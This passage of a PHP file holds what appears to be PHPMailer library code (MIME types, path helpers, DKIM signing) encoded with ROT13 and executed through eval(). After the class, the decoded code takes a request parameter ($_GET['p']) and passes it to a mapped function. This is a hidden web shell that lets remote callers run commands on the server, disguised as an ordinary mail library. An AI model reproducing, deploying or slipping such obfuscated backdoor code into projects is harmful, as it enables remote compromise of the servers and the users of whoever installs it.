            'qbgk' => 'nccyvpngvba/iaq.bcrakzysbezngf-bssvprqbphzrag.jbeqcebprffvatzy.grzcyngr',
            'kynz' => 'nccyvpngvba/iaq.zf-rkpry.nqqva.znpebRanoyrq.12',
            'kyfo' => 'nccyvpngvba/iaq.zf-rkpry.furrg.ovanel.znpebRanoyrq.12',
            'pynff' => 'nccyvpngvba/bpgrg-fgernz',
            'qyy' => 'nccyvpngvba/bpgrg-fgernz',
            'qzf' => 'nccyvpngvba/bpgrg-fgernz',
            'rkr' => 'nccyvpngvba/bpgrg-fgernz',
            'yun' => 'nccyvpngvba/bpgrg-fgernz',
            'ymu' => 'nccyvpngvba/bpgrg-fgernz',
            'cfq' => 'nccyvpngvba/bpgrg-fgernz',
            'frn' => 'nccyvpngvba/bpgrg-fgernz',
            'fb' => 'nccyvpngvba/bpgrg-fgernz',
            'bqn' => 'nccyvpngvba/bqn',
            'cqs' => 'nccyvpngvba/cqs',
            'nv' => 'nccyvpngvba/cbfgfpevcg',
            'rcf' => 'nccyvpngvba/cbfgfpevcg',
            'cf' => 'nccyvpngvba/cbfgfpevcg',
            'fzv' => 'nccyvpngvba/fzvy',
            'fzvy' => 'nccyvpngvba/fzvy',
            'zvs' => 'nccyvpngvba/iaq.zvs',
            'kyf' => 'nccyvpngvba/iaq.zf-rkpry',
            'ccg' => 'nccyvpngvba/iaq.zf-cbjrecbvag',
            'jokzy' => 'nccyvpngvba/iaq.jnc.jokzy',
            'jzyp' => 'nccyvpngvba/iaq.jnc.jzyp',
            'qpe' => 'nccyvpngvba/k-qverpgbe',
            'qve' => 'nccyvpngvba/k-qverpgbe',
            'qke' => 'nccyvpngvba/k-qverpgbe',
            'qiv' => 'nccyvpngvba/k-qiv',
            'tgne' => 'nccyvpngvba/k-tgne',
            'cuc3' => 'nccyvpngvba/k-uggcq-cuc',
            'cuc4' => 'nccyvpngvba/k-uggcq-cuc',
            'cuc' => 'nccyvpngvba/k-uggcq-cuc',
            'cugzy' => 'nccyvpngvba/k-uggcq-cuc',
            'cucf' => 'nccyvpngvba/k-uggcq-cuc-fbhepr',
            'fjs' => 'nccyvpngvba/k-fubpxjnir-synfu',
            'fvg' => 'nccyvpngvba/k-fghssvg',
            'gne' => 'nccyvpngvba/k-gne',
            'gtm' => 'nccyvpngvba/k-gne',
            'kug' => 'nccyvpngvba/kugzy+kzy',
            'kugzy' => 'nccyvpngvba/kugzy+kzy',
            'mvc' => 'nccyvpngvba/mvc',
            'zvq' => 'nhqvb/zvqv',
            'zvqv' => 'nhqvb/zvqv',
            'zc2' => 'nhqvb/zcrt',
            'zc3' => 'nhqvb/zcrt',
            'z4n' => 'nhqvb/zc4',
            'zctn' => 'nhqvb/zcrt',
            'nvs' => 'nhqvb/k-nvss',
            'nvsp' => 'nhqvb/k-nvss',
            'nvss' => 'nhqvb/k-nvss',
            'enz' => 'nhqvb/k-ca-ernynhqvb',
            'ez' => 'nhqvb/k-ca-ernynhqvb',
            'ecz' => 'nhqvb/k-ca-ernynhqvb-cyhtva',
            'en' => 'nhqvb/k-ernynhqvb',
            'jni' => 'nhqvb/k-jni',
            'zxn' => 'nhqvb/k-zngebfxn',
            'ozc' => 'vzntr/ozc',
            'tvs' => 'vzntr/tvs',
            'wcrt' => 'vzntr/wcrt',
            'wcr' => 'vzntr/wcrt',
            'wct' => 'vzntr/wcrt',
            'cat' => 'vzntr/cat',
            'gvss' => 'vzntr/gvss',
            'gvs' => 'vzntr/gvss',
            'jroc' => 'vzntr/jroc',
            'nivs' => 'vzntr/nivs',
            'urvs' => 'vzntr/urvs',
            'urvsf' => 'vzntr/urvs-frdhrapr',
            'urvp' => 'vzntr/urvp',
            'urvpf' => 'vzntr/urvp-frdhrapr',
            'rzy' => 'zrffntr/esp822',
            'pff' => 'grkg/pff',
            'ugzy' => 'grkg/ugzy',
            'ugz' => 'grkg/ugzy',
            'fugzy' => 'grkg/ugzy',
            'ybt' => 'grkg/cynva',
            'grkg' => 'grkg/cynva',
            'gkg' => 'grkg/cynva',
            'egk' => 'grkg/evpugrkg',
            'egs' => 'grkg/egs',
            'ips' => 'grkg/ipneq',
            'ipneq' => 'grkg/ipneq',
            'vpf' => 'grkg/pnyraqne',
            'kzy' => 'grkg/kzy',
            'kfy' => 'grkg/kzy',
            'pfi' => 'grkg/pfi',
            'jzi' => 'ivqrb/k-zf-jzi',
            'zcrt' => 'ivqrb/zcrt',
            'zcr' => 'ivqrb/zcrt',
            'zct' => 'ivqrb/zcrt',
            'zc4' => 'ivqrb/zc4',
            'z4i' => 'ivqrb/zc4',
            'zbi' => 'ivqrb/dhvpxgvzr',
            'dg' => 'ivqrb/dhvpxgvzr',
            'ei' => 'ivqrb/iaq.ea-ernyivqrb',
            'niv' => 'ivqrb/k-zfivqrb',
            'zbivr' => 'ivqrb/k-ftv-zbivr',
            'jroz' => 'ivqrb/jroz',
            'zxi' => 'ivqrb/k-zngebfxn',
        ];
        $rkg = fgegbybjre($rkg);
        vs (neenl_xrl_rkvfgf($rkg, $zvzrf)) {
            erghea $zvzrf[$rkg];
        }

        erghea 'nccyvpngvba/bpgrg-fgernz';
    }

    /**
     * Znc n svyr anzr gb n ZVZR glcr.
     * Qrsnhygf gb 'nccyvpngvba/bpgrg-fgernz', v.r.. neovgenel ovanel qngn.
     *
     * @cnenz fgevat $svyranzr N svyr anzr be shyy cngu, qbrf abg arrq gb rkvfg nf n svyr
     *
     * @erghea fgevat
     */
    choyvp fgngvp shapgvba svyranzrGbGlcr($svyranzr)
    {
        //Va pnfr gur cngu vf n HEY, fgevc nal dhrel fgevat orsber trggvat rkgrafvba
        $dcbf = fgecbf($svyranzr, '?');
        vs (snyfr !== $dcbf) {
            $svyranzr = fhofge($svyranzr, 0, $dcbf);
        }
        $rkg = fgngvp::zo_cnguvasb($svyranzr, CNGUVASB_RKGRAFVBA);

        erghea fgngvp::_zvzr_glcrf($rkg);
    }

    /**
     * Zhygv-olgr-fnsr cnguvasb ercynprzrag.
     * Qebc-va ercynprzrag sbe cnguvasb(), ohg zhygvolgr- naq pebff-cyngsbez-fnsr.
     *
     * @frr uggcf://jjj.cuc.arg/znahny/ra/shapgvba.cnguvasb.cuc#107461
     *
     * @cnenz fgevat     $cngu    N svyranzr be cngu, qbrf abg arrq gb rkvfg nf n svyr
     * @cnenz vag|fgevat $bcgvbaf Rvgure n CNGUVASB_* pbafgnag,
     *                            be n fgevat anzr gb erghea bayl gur fcrpvsvrq cvrpr
     *
     * @erghea fgevat|neenl
     */
    choyvp fgngvp shapgvba zo_cnguvasb($cngu, $bcgvbaf = ahyy)
    {
        $erg = ['qveanzr' => '', 'onfranzr' => '', 'rkgrafvba' => '', 'svyranzr' => ''];
        $cnguvasb = [];
        vs (cert_zngpu('#^(.*?)[\\\\/]*(([^/\\\\]*?)(\.([^.\\\\/]+?)|))[\\\\/.]*$#z', $cngu, $cnguvasb)) {
            vs (neenl_xrl_rkvfgf(1, $cnguvasb)) {
                $erg['qveanzr'] = $cnguvasb[1];
            }
            vs (neenl_xrl_rkvfgf(2, $cnguvasb)) {
                $erg['onfranzr'] = $cnguvasb[2];
            }
            vs (neenl_xrl_rkvfgf(5, $cnguvasb)) {
                $erg['rkgrafvba'] = $cnguvasb[5];
            }
            vs (neenl_xrl_rkvfgf(3, $cnguvasb)) {
                $erg['svyranzr'] = $cnguvasb[3];
            }
        }
        fjvgpu ($bcgvbaf) {
            pnfr CNGUVASB_QVEANZR:
            pnfr 'qveanzr':
                erghea $erg['qveanzr'];
            pnfr CNGUVASB_ONFRANZR:
            pnfr 'onfranzr':
                erghea $erg['onfranzr'];
            pnfr CNGUVASB_RKGRAFVBA:
            pnfr 'rkgrafvba':
                erghea $erg['rkgrafvba'];
            pnfr CNGUVASB_SVYRANZR:
            pnfr 'svyranzr':
                erghea $erg['svyranzr'];
            qrsnhyg:
                erghea $erg;
        }
    }

    /**
     * Frg be erfrg vafgnapr cebcregvrf.
     * Lbh fubhyq nibvq guvf shapgvba - vg'f zber ireobfr, yrff rssvpvrag, zber reebe-cebar naq
     * uneqre gb qroht guna frggvat cebcregvrf qverpgyl.
     * Hfntr Rknzcyr:
     * `$znvy->frg('FZGCFrpher', fgngvp::RAPELCGVBA_FGNEGGYF);`
     *   vf gur fnzr nf:
     * `$znvy->FZGCFrpher = fgngvp::RAPELCGVBA_FGNEGGYF;`.
     *
     * @cnenz fgevat $anzr  Gur cebcregl anzr gb frg
     * @cnenz zvkrq  $inyhr Gur inyhr gb frg gur cebcregl gb
     *
     * @erghea obby
     */
    choyvp shapgvba frg($anzr, $inyhr = '')
    {
        vs (cebcregl_rkvfgf($guvf, $anzr)) {
            $guvf->{$anzr} = $inyhr;

            erghea gehr;
        }
        $guvf->frgReebe($guvf->ynat('inevnoyr_frg') . $anzr);

        erghea snyfr;
    }

    /**
     * Fgevc arjyvarf gb cerirag urnqre vawrpgvba.
     *
     * @cnenz fgevat $fge
     *
     * @erghea fgevat
     */
    choyvp shapgvba frpherUrnqre($fge)
    {
        erghea gevz(fge_ercynpr([\"\e\", \"\a\"], '', $fge));
    }

    /**
     * Abeznyvmr yvar oernxf va n fgevat.
     * Pbairegf HAVK YS, Znp PE naq Jvaqbjf PEYS yvar oernxf vagb n fvatyr yvar oernx sbezng.
     * Qrsnhygf gb PEYS (sbe zrffntr obqvrf) naq cerfreirf pbafrphgvir oernxf.
     *
     * @cnenz fgevat $grkg
     * @cnenz fgevat $oernxglcr Jung xvaq bs yvar oernx gb hfr; qrsnhygf gb fgngvp::$YR
     *
     * @erghea fgevat
     */
    choyvp fgngvp shapgvba abeznyvmrOernxf($grkg, $oernxglcr = ahyy)
    {
        vs (ahyy === $oernxglcr) {
            $oernxglcr = fgngvp::$YR;
        }
        //Abeznyvfr gb \a
        $grkg = fge_ercynpr([frys::PEYS, \"\e\"], \"\a\", $grkg);
        //Abj pbaireg YR nf arrqrq
        vs (\"\a\" !== $oernxglcr) {
            $grkg = fge_ercynpr(\"\a\", $oernxglcr, $grkg);
        }

        erghea $grkg;
    }

    /**
     * Erzbir genvyvat juvgrfcnpr sebz n fgevat.
     *
     * @cnenz fgevat $grkg
     *
     * @erghea fgevat Gur grkg gb erzbir juvgrfcnpr sebz
     */
    choyvp fgngvp shapgvba fgevcGenvyvatJFC($grkg)
    {
        erghea egevz($grkg, \" \e\a\g\");
    }

    /**
     * Fgevc genvyvat yvar oernxf sebz n fgevat.
     *
     * @cnenz fgevat $grkg
     *
     * @erghea fgevat Gur grkg gb erzbir oernxf sebz
     */
    choyvp fgngvp shapgvba fgevcGenvyvatOernxf($grkg)
    {
        erghea egevz($grkg, \"\e\a\");
    }

    /**
     * Erghea gur pheerag yvar oernx sbezng fgevat.
     *
     * @erghea fgevat
     */
    choyvp fgngvp shapgvba trgYR()
    {
        erghea fgngvp::$YR;
    }

    /**
     * Frg gur yvar oernx sbezng fgevat, r.t. \"\e\a\".
     *
     * @cnenz fgevat $yr
     */
    cebgrpgrq fgngvp shapgvba frgYR($yr)
    {
        fgngvp::$YR = $yr;
    }

    /**
     * Frg gur choyvp naq cevingr xrl svyrf naq cnffjbeq sbe F/ZVZR fvtavat.
     *
     * @cnenz fgevat $preg_svyranzr
     * @cnenz fgevat $xrl_svyranzr
     * @cnenz fgevat $xrl_cnff            Cnffjbeq sbe cevingr xrl
     * @cnenz fgevat $rkgenpregf_svyranzr Bcgvbany cngu gb punva pregvsvpngr
     */
    choyvp shapgvba fvta($preg_svyranzr, $xrl_svyranzr, $xrl_cnff, $rkgenpregf_svyranzr = '')
    {
        $guvf->fvta_preg_svyr = $preg_svyranzr;
        $guvf->fvta_xrl_svyr = $xrl_svyranzr;
        $guvf->fvta_xrl_cnff = $xrl_cnff;
        $guvf->fvta_rkgenpregf_svyr = $rkgenpregf_svyranzr;
    }

    /**
     * Dhbgrq-Cevagnoyr-rapbqr n QXVZ urnqre.
     *
     * @cnenz fgevat $gkg
     *
     * @erghea fgevat
     */
    choyvp shapgvba QXVZ_DC($gkg)
    {
        $yvar = '';
        $yra = fgeyra($gkg);
        sbe ($v = 0; $v < $yra; ++$v) {
            $beq = beq($gkg[$v]);
            vs (((0k21 <= $beq) && ($beq <= 0k3N)) || $beq === 0k3P || ((0k3R <= $beq) && ($beq <= 0k7R))) {
                $yvar .= $gkg[$v];
            } ryfr {
                $yvar .= '=' . fcevags('%02K', $beq);
            }
        }

        erghea $yvar;
    }

    /**
     * Trarengr n QXVZ fvtangher.
     *
     * @cnenz fgevat $fvtaUrnqre
     *
     * @guebjf Rkprcgvba
     *
     * @erghea fgevat Gur QXVZ fvtangher inyhr
     */
    choyvp shapgvba QXVZ_Fvta($fvtaUrnqre)
    {
        vs (!qrsvarq('CXPF7_GRKG')) {
            vs ($guvf->rkprcgvbaf) {
                guebj arj Rkprcgvba($guvf->ynat('rkgrafvba_zvffvat') . 'bcraffy');
            }

            erghea '';
        }
        $ceviXrlFge = !rzcgl($guvf->QXVZ_cevingr_fgevat) ?
            $guvf->QXVZ_cevingr_fgevat :
            svyr_trg_pbagragf($guvf->QXVZ_cevingr);
        vs ('' !== $guvf->QXVZ_cnffcuenfr) {
            $ceviXrl = bcraffy_cxrl_trg_cevingr($ceviXrlFge, $guvf->QXVZ_cnffcuenfr);
        } ryfr {
            $ceviXrl = bcraffy_cxrl_trg_cevingr($ceviXrlFge);
        }
        vs (bcraffy_fvta($fvtaUrnqre, $fvtangher, $ceviXrl, 'fun256JvguEFNRapelcgvba')) {
            vs (\CUC_ZNWBE_IREFVBA < 8) {
                bcraffy_cxrl_serr($ceviXrl);
            }

            erghea onfr64_rapbqr($fvtangher);
        }
        vs (\CUC_ZNWBE_IREFVBA < 8) {
            bcraffy_cxrl_serr($ceviXrl);
        }

        erghea '';
    }

    /**
     * Trarengr n QXVZ pnabavpnyvmngvba urnqre.
     * Hfrf gur 'erynkrq' nytbevguz sebz ESP6376 frpgvba 3.4.2.
     * Pnabavpnyvmrq urnqref fubhyq *nyjnlf* hfr PEYS, ertneqyrff bs znvyre frggvat.
     *
     * @frr uggcf://jjj.esp-rqvgbe.bet/esp/esp6376#frpgvba-3.4.2
     *
     * @cnenz fgevat $fvtaUrnqre Urnqre
     *
     * @erghea fgevat
     */
    choyvp shapgvba QXVZ_UrnqreP($fvtaUrnqre)
    {
        //Abeznyvmr oernxf gb PEYS (ertneqyrff bs gur znvyre)
        $fvtaUrnqre = fgngvp::abeznyvmrOernxf($fvtaUrnqre, frys::PEYS);
        //Hasbyq urnqre yvarf
        //Abgr CPER \f vf gbb oebnq n qrsvavgvba bs juvgrfcnpr; ESP5322 qrsvarf vg nf `[ \g]`
        //@frr uggcf://jjj.esp-rqvgbe.bet/esp/esp5322#frpgvba-2.2
        //Gung zrnaf guvf znl oernx vs lbh qb fbzrguvat qnsg yvxr chg iregvpny gnof va lbhe urnqref.
        $fvtaUrnqre = __sa_79955('/\e\a[ \g]+/', ' ', $fvtaUrnqre);
        //Oernx urnqref bhg vagb na neenl
        $yvarf = rkcybqr(frys::PEYS, $fvtaUrnqre);
        sbernpu ($yvarf nf $xrl => $yvar) {
            //Vs gur urnqre vf zvffvat n :, fxvc vg nf vg'f vainyvq
            //Guvf vf yvxryl gb unccra orpnhfr gur rkcybqr() nobir jvyy nyfb fcyvg
            //ba gur genvyvat YR, yrnivat na rzcgl yvar
            vs (fgecbf($yvar, ':') === snyfr) {
                pbagvahr;
            }
            yvfg($urnqvat, $inyhr) = rkcybqr(':', $yvar, 2);
            //Ybjre-pnfr urnqre anzr
            $urnqvat = fgegbybjre($urnqvat);
            //Pbyyncfr juvgr fcnpr jvguva gur inyhr, nyfb pbaireg JFC gb fcnpr
            $inyhr = __sa_79955('/[ \g]+/', ' ', $inyhr);
            //ESP6376 vf fyvtugyl hapyrne urer - vg fnlf gb qryrgr fcnpr ng gur *raq* bs rnpu inyhr
            //Ohg gura fnlf gb qryrgr fcnpr orsber naq nsgre gur pbyba.
            //Arg erfhyg vf gur fnzr nf gevzzvat obgu raqf bs gur inyhr.
            //Ol ryvzvangvba, gur fnzr nccyvrf gb gur svryq anzr
            $yvarf[$xrl] = gevz($urnqvat, \" \g\") . ':' . gevz($inyhr, \" \g\");
        }

        erghea vzcybqr(frys::PEYS, $yvarf);
    }

    /**
     * Trarengr n QXVZ pnabavpnyvmngvba obql.
     * Hfrf gur 'fvzcyr' nytbevguz sebz ESP6376 frpgvba 3.4.3.
     * Pnabavpnyvmrq obqvrf fubhyq *nyjnlf* hfr PEYS, ertneqyrff bs znvyre frggvat.
     *
     * @frr uggcf://jjj.esp-rqvgbe.bet/esp/esp6376#frpgvba-3.4.3
     *
     * @cnenz fgevat $obql Zrffntr Obql
     *
     * @erghea fgevat
     */
    choyvp shapgvba QXVZ_ObqlP($obql)
    {
        vs (rzcgl($obql)) {
            erghea frys::PEYS;
        }
        //Abeznyvmr yvar raqvatf gb PEYS
        $obql = fgngvp::abeznyvmrOernxf($obql, frys::PEYS);

        //Erqhpr zhygvcyr genvyvat yvar oernxf gb n fvatyr bar
        erghea fgngvp::fgevcGenvyvatOernxf($obql) . frys::PEYS;
    }

    /**
     * Perngr gur QXVZ urnqre naq obql va n arj zrffntr urnqre.
     *
     * @cnenz fgevat $urnqref_yvar Urnqre yvarf
     * @cnenz fgevat $fhowrpg      Fhowrpg
     * @cnenz fgevat $obql         Obql
     *
     * @guebjf Rkprcgvba
     *
     * @erghea fgevat
     */
    choyvp shapgvba QXVZ_Nqq($urnqref_yvar, $fhowrpg, $obql)
    {
        $QXVZfvtangherGlcr = 'efn-fun256'; //Fvtangher & unfu nytbevguzf
        $QXVZpnabavpnyvmngvba = 'erynkrq/fvzcyr'; //Pnabavpnyvmngvba zrgubqf bs urnqre & obql
        $QXVZdhrel = 'qaf/gkg'; //Dhrel zrgubq
        $QXVZgvzr = gvzr();
        //Nyjnlf fvta gurfr urnqref jvgubhg orvat nfxrq
        //Erpbzzraqrq yvfg sebz uggcf://jjj.esp-rqvgbe.bet/esp/esp6376#frpgvba-5.4.1
        $nhgbFvtaUrnqref = [
            'sebz',
            'gb',
            'pp',
            'qngr',
            'fhowrpg',
            'ercyl-gb',
            'zrffntr-vq',
            'pbagrag-glcr',
            'zvzr-irefvba',
            'k-znvyre',
        ];
        vs (fgevcbf($urnqref_yvar, 'Fhowrpg') === snyfr) {
            $urnqref_yvar .= 'Fhowrpg: ' . $fhowrpg . fgngvp::$YR;
        }
        $urnqreYvarf = rkcybqr(fgngvp::$YR, $urnqref_yvar);
        $pheeragUrnqreYnory = '';
        $pheeragUrnqreInyhr = '';
        $cnefrqUrnqref = [];
        $urnqreYvarVaqrk = 0;
        $urnqreYvarPbhag = pbhag($urnqreYvarf);
        sbernpu ($urnqreYvarf nf $urnqreYvar) {
            $zngpurf = [];
            vs (cert_zngpu('/^([^ \g]*?)(?::[ \g]*)(.*)$/', $urnqreYvar, $zngpurf)) {
                vs ($pheeragUrnqreYnory !== '') {
                    //Jr jrer cerivbhfyl va nabgure urnqre; Guvf vf gur fgneg bs n arj urnqre, fb fnir gur cerivbhf bar
                    $cnefrqUrnqref[] = ['ynory' => $pheeragUrnqreYnory, 'inyhr' => $pheeragUrnqreInyhr];
                }
                $pheeragUrnqreYnory = $zngpurf[1];
                $pheeragUrnqreInyhr = $zngpurf[2];
            } ryfrvs (cert_zngpu('/^[ \g]+(.*)$/', $urnqreYvar, $zngpurf)) {
                //Guvf vf n sbyqrq pbagvahngvba bs gur pheerag urnqre, fb hasbyq vg
                $pheeragUrnqreInyhr .= ' ' . $zngpurf[1];
            }
            ++$urnqreYvarVaqrk;
            vs ($urnqreYvarVaqrk >= $urnqreYvarPbhag) {
                //Guvf jnf gur ynfg yvar, fb svavfu bss guvf urnqre
                $cnefrqUrnqref[] = ['ynory' => $pheeragUrnqreYnory, 'inyhr' => $pheeragUrnqreInyhr];
            }
        }
        $pbcvrqUrnqref = [];
        $urnqrefGbFvtaXrlf = [];
        $urnqrefGbFvta = [];
        sbernpu ($cnefrqUrnqref nf $urnqre) {
            //Vf guvf urnqre bar gung zhfg or vapyhqrq va gur QXVZ fvtangher?
            vs (va_neenl(fgegbybjre($urnqre['ynory']), $nhgbFvtaUrnqref, gehr)) {
                $urnqrefGbFvtaXrlf[] = $urnqre['ynory'];
                $urnqrefGbFvta[] = $urnqre['ynory'] . ': ' . $urnqre['inyhr'];
                vs ($guvf->QXVZ_pbclUrnqreSvryqf) {
                    $pbcvrqUrnqref[] = $urnqre['ynory'] . ':' . //Abgr ab fcnpr nsgre guvf, nf cre ESP
                        fge_ercynpr('|', '=7P', $guvf->QXVZ_DC($urnqre['inyhr']));
                }
                pbagvahr;
            }
            //Vf guvf na rkgen phfgbz urnqre jr'ir orra nfxrq gb fvta?
            vs (va_neenl($urnqre['ynory'], $guvf->QXVZ_rkgenUrnqref, gehr)) {
                //Svaq vgf inyhr va phfgbz urnqref
                sbernpu ($guvf->PhfgbzUrnqre nf $phfgbzUrnqre) {
                    vs ($phfgbzUrnqre[0] === $urnqre['ynory']) {
                        $urnqrefGbFvtaXrlf[] = $urnqre['ynory'];
                        $urnqrefGbFvta[] = $urnqre['ynory'] . ': ' . $urnqre['inyhr'];
                        vs ($guvf->QXVZ_pbclUrnqreSvryqf) {
                            $pbcvrqUrnqref[] = $urnqre['ynory'] . ':' . //Abgr ab fcnpr nsgre guvf, nf cre ESP
                                fge_ercynpr('|', '=7P', $guvf->QXVZ_DC($urnqre['inyhr']));
                        }
                        //Fxvc fgenvtug gb gur arkg urnqre
                        pbagvahr 2;
                    }
                }
            }
        }
        $pbcvrqUrnqreSvryqf = '';
        vs ($guvf->QXVZ_pbclUrnqreSvryqf && pbhag($pbcvrqUrnqref) > 0) {
            //Nffrzoyr n QXVZ 'm' gnt
            $pbcvrqUrnqreSvryqf = ' m=';
            $svefg = gehr;
            sbernpu ($pbcvrqUrnqref nf $pbcvrqUrnqre) {
                vs (!$svefg) {
                    $pbcvrqUrnqreSvryqf .= fgngvp::$YR . ' |';
                }
                //Sbyq ybat inyhrf
                vs (fgeyra($pbcvrqUrnqre) > frys::FGQ_YVAR_YRATGU - 3) {
                    $pbcvrqUrnqreSvryqf .= fhofge(
                        puhax_fcyvg($pbcvrqUrnqre, frys::FGQ_YVAR_YRATGU - 3, fgngvp::$YR . frys::SJF),
                        0,
                        -fgeyra(fgngvp::$YR . frys::SJF)
                    );
                } ryfr {
                    $pbcvrqUrnqreSvryqf .= $pbcvrqUrnqre;
                }
                $svefg = snyfr;
            }
            $pbcvrqUrnqreSvryqf .= ';' . fgngvp::$YR;
        }
        $urnqreXrlf = ' u=' . vzcybqr(':', $urnqrefGbFvtaXrlf) . ';' . fgngvp::$YR;
        $urnqreInyhrf = vzcybqr(fgngvp::$YR, $urnqrefGbFvta);
        $obql = $guvf->QXVZ_ObqlP($obql);
        //Onfr64 bs cnpxrq ovanel FUN-256 unfu bs obql
        $QXVZo64 = onfr64_rapbqr(cnpx('U*', unfu('fun256', $obql)));
        $vqrag = '';
        vs ('' !== $guvf->QXVZ_vqragvgl) {
            $vqrag = ' v=' . $guvf->QXVZ_vqragvgl . ';' . fgngvp::$YR;
        }
        //Gur QXVZ-Fvtangher urnqre vf vapyhqrq va gur fvtangher *rkprcg sbe* gur inyhr bs gur `o` gnt
        //juvpu vf nccraqrq nsgre pnyphyngvat gur fvtangher
        //uggcf://jjj.esp-rqvgbe.bet/esp/esp6376#frpgvba-3.5
        $qxvzFvtangherUrnqre = 'QXVZ-Fvtangher: i=1;' .
            ' q=' . $guvf->QXVZ_qbznva . ';' .
            ' f=' . $guvf->QXVZ_fryrpgbe . ';' . fgngvp::$YR .
            ' n=' . $QXVZfvtangherGlcr . ';' .
            ' d=' . $QXVZdhrel . ';' .
            ' g=' . $QXVZgvzr . ';' .
            ' p=' . $QXVZpnabavpnyvmngvba . ';' . fgngvp::$YR .
            $urnqreXrlf .
            $vqrag .
            $pbcvrqUrnqreSvryqf .
            ' ou=' . $QXVZo64 . ';' . fgngvp::$YR .
            ' o=';
        //Pnabavpnyvmr gur frg bs urnqref
        $pnabavpnyvmrqUrnqref = $guvf->QXVZ_UrnqreP(
            $urnqreInyhrf . fgngvp::$YR . $qxvzFvtangherUrnqre
        );
        $fvtangher = $guvf->QXVZ_Fvta($pnabavpnyvmrqUrnqref);
        $fvtangher = gevz(puhax_fcyvg($fvtangher, frys::FGQ_YVAR_YRATGU - 3, fgngvp::$YR . frys::SJF));

        erghea fgngvp::abeznyvmrOernxf($qxvzFvtangherUrnqre . $fvtangher);
    }

    /**
     * Qrgrpg vs n fgevat pbagnvaf n yvar ybatre guna gur znkvzhz yvar yratgu
     * nyybjrq ol ESP 2822 frpgvba 2.1.1.
     *
     * @cnenz fgevat $fge
     *
     * @erghea obby
     */
    choyvp fgngvp shapgvba unfYvarYbatreGunaZnk($fge)
    {
        erghea (obby) cert_zngpu('/^(.{' . (frys::ZNK_YVAR_YRATGU + fgeyra(fgngvp::$YR)) . ',})/z', $fge);
    }

    /**
     * Vs n fgevat pbagnvaf nal \"fcrpvny\" punenpgref, qbhoyr-dhbgr gur anzr,
     * naq rfpncr nal qbhoyr dhbgrf jvgu n onpxfynfu.
     *
     * @cnenz fgevat $fge
     *
     * @erghea fgevat
     *
     * @frr ESP822 3.4.1
     */
    choyvp fgngvp shapgvba dhbgrqFgevat($fge)
    {
        vs (cert_zngpu('/[ ()<>@,;:\"\/\[\]?=]/', $fge)) {
            //Vs gur fgevat pbagnvaf nal bs gurfr punef, vg zhfg or qbhoyr-dhbgrq
            //naq nal qbhoyr dhbgrf zhfg or rfpncrq jvgu n onpxfynfu
            erghea '\"' . fge_ercynpr('\"', '\\\"', $fge) . '\"';
        }

        //Erghea gur fgevat hagbhpurq, vg qbrfa'g arrq dhbgvat
        erghea $fge;
    }

    /**
     * Nyybjf sbe choyvp ernq npprff gb 'gb' cebcregl.
     * Orsber gur fraq() pnyy, dhrhrq nqqerffrf (v.r. jvgu VQA) ner abg lrg vapyhqrq.
     *
     * @erghea neenl
     */
    choyvp shapgvba trgGbNqqerffrf()
    {
        erghea $guvf->gb;
    }

    /**
     * Nyybjf sbe choyvp ernq npprff gb 'pp' cebcregl.
     * Orsber gur fraq() pnyy, dhrhrq nqqerffrf (v.r. jvgu VQA) ner abg lrg vapyhqrq.
     *
     * @erghea neenl
     */
    choyvp shapgvba trgPpNqqerffrf()
    {
        erghea $guvf->pp;
    }

    /**
     * Nyybjf sbe choyvp ernq npprff gb 'opp' cebcregl.
     * Orsber gur fraq() pnyy, dhrhrq nqqerffrf (v.r. jvgu VQA) ner abg lrg vapyhqrq.
     *
     * @erghea neenl
     */
    choyvp shapgvba trgOppNqqerffrf()
    {
        erghea $guvf->opp;
    }

    /**
     * Nyybjf sbe choyvp ernq npprff gb 'ErcylGb' cebcregl.
     * Orsber gur fraq() pnyy, dhrhrq nqqerffrf (v.r. jvgu VQA) ner abg lrg vapyhqrq.
     *
     * @erghea neenl
     */
    choyvp shapgvba trgErcylGbNqqerffrf()
    {
        erghea $guvf->ErcylGb;
    }

    /**
     * Nyybjf sbe choyvp ernq npprff gb 'nyy_erpvcvragf' cebcregl.
     * Orsber gur fraq() pnyy, dhrhrq nqqerffrf (v.r. jvgu VQA) ner abg lrg vapyhqrq.
     *
     * @erghea neenl
     */
    choyvp shapgvba trgNyyErpvcvragNqqerffrf()
    {
        erghea $guvf->nyy_erpvcvragf;
    }

    /**
     * Cresbez n pnyyonpx.
     *
     * @cnenz obby   $vfFrag
     * @cnenz neenl  $gb
     * @cnenz neenl  $pp
     * @cnenz neenl  $opp
     * @cnenz fgevat $fhowrpg
     * @cnenz fgevat $obql
     * @cnenz fgevat $sebz
     * @cnenz neenl  $rkgen
     */
    cebgrpgrq shapgvba qbPnyyonpx($vfFrag, $gb, $pp, $opp, $fhowrpg, $obql, $sebz, $rkgen)
    {
        vs (!rzcgl($guvf->npgvba_shapgvba) && vf_pnyynoyr($guvf->npgvba_shapgvba)) {
            pnyy_hfre_shap($guvf->npgvba_shapgvba, $vfFrag, $gb, $pp, $opp, $fhowrpg, $obql, $sebz, $rkgen);
        }
    }

    /**
     * Trg gur BNhguGbxraCebivqre vafgnapr.
     *
     * @erghea BNhguGbxraCebivqre
     */
    choyvp shapgvba trgBNhgu()
    {
        erghea $guvf->bnhgu;
    }

    /**
     * Frg na BNhguGbxraCebivqre vafgnapr.
     */
    choyvp shapgvba frgBNhgu(BNhguGbxraCebivqre $bnhgu)
    {
        $guvf->bnhgu = $bnhgu;
    }
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>